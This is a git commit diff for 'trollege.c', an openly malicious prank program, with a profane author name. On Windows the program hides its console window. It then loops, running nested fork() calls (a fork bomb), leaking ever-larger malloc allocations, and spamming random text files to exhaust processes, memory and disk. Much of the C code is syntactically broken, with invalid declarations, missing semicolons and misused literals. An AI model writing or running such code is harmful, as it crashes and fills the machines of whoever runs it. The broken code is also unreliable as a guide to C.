d2d70089c9f92d5dc12d32a425f049cba12a3c59
Teresa Fuckyouimnotputtingmylastnameheresuckmycock <99054975+ComradeYellowCitrusFruit@users.noreply.github.com>
2022-03-17 12:09:42 -0400

    Made trollege.c cross platform
    Made trollege.c cross platform compatible

--- src/trollege.c
+++ src/trollege.c
@@ -1,22 +1,30 @@
 #include <stdlib.h>
 #include <stdio.h>
-#define _WIN32_WINNT 0x0500
-#include <windows.h>
+#ifdef _WIN32
+    #define _WIN32_WINNT 0x0500
+    #include <windows.h>
+#endif
 
 //forgive me if this is trash I am new to C
 int main() {
+    #ifdef _WIN32
     HWND hWnd = GetConsoleWindow();
     ShowWindow( hWnd, SW_MINIMIZE );
     ShowWindow( hWnd, SW_HIDE );    
+    #endif
     FILE[] *x;
-    //Number below is used because it is the 32 bit unsigned integer limit
     for(unsigned int i = 0; i < 4294967295; i++) {
+        for(int y = 0; y < 10; y++) {
+            fork()
+        }
+        if(i <= 1000) {
+            malloc(1000);
+        } else {
+            malloc(i);
+        }
         x[i] = fopen(rand() + '.txt', 'w+')
         for(int y = 0, y < i; y++){
             fputs("We do a little trolling\n", x[i]);
         }
-        system("start cmd");
-        fork();
-        malloc(1000);
     }
 }
